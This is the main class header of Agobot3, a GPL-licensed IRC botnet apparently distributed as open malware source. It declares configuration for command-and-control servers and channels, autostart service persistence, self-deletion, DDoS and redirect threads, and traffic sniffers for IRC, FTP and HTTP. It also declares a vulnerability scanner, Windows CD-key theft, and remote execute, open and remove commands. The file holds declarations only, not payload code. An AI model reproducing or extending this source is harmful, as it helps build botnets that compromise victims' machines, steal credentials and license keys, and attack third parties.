/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef __BOT_H__
#define __BOT_H__

#include "cvar.h"
#include "commands.h"
#include "message.h"
#include "irc.h"
CString dp(const int one, ...);
class CBot : public CCommandHandler{
public:
	CBot();
	void Init();
	void Config();
	void Recv(CMessage *pMsg, bool bInternal=false);
	void SetCvar(cvar * nun, CString sValue);
	void SetCvarD(cvar * nun, CString sDesc, CString sValue);
	bool HandleMsg(CMessage *pMsg);
	bool HandleMsgInt(CMessage *pMsg);
	bool Think();

	CString SysInfo();
	CString LongUptime(int iDays);
	CString Status();

	bool m_bJoined;
	unsigned long m_lStartTime;

	cvar	si_nickprefix,\
			si_server, \
			si_port, \
			si_servpass,\
			si_mainchan, \
			si_chanpass, \
			si_nick, \
			si_usessl, \
			bot_version, \
			bot_filename, \
			bot_id, \
			bot_prefix, \
			bot_ftrans_port, \
			bot_ftrans_port_ftp, \
			bot_timeout, \
			bot_seclogin, \
			bot_compnick, \
			bot_randnick, \
			bot_meltserver, \
			bot_topiccmd, \
			as_valname, \
			as_enabled, \
			as_service, \
			as_service_name, \
			scan_channel,\
// MAX THREADS
			scan_maxthreads, \
			ddos_maxthreads, \
			redir_maxthreads, \
// ENABLED VALUES
			sniffer_enabled, \
			scanner_enabled, \
			secure_enabled, \
		/*	speedtest_enabled, \*/
			identd_enabled, \
// SNIFFER CHANNELS
			sniffer_channel, \
			ircv_channel, \
			ftpv_channel, \
			httpv_channel, \
			vuln_channel, \
			pms_channel,  \
			cdkey_windows, \
			csendfileftp_show;

	bool HandleCommand(CMessage *pMsg);

	command	m_cmdRemove, m_cmdStatus, m_cmdRndNick, m_cmdDie, m_cmdId, m_cmdAbout, \
			m_cmdSysInfo, m_cmdLongUptime, m_cmdNick, m_cmdOpen, m_cmdDns, \
			m_cmdExecute, m_cmdQuit, m_cmdFlushDNS, m_cmdSecure, m_cmdCommand, m_cmdFindFile;
	irc_server	m_isServerRoot, m_isServer0, m_isServer1, m_isServer2, m_isServer3;
};

#endif // __BOT_H__
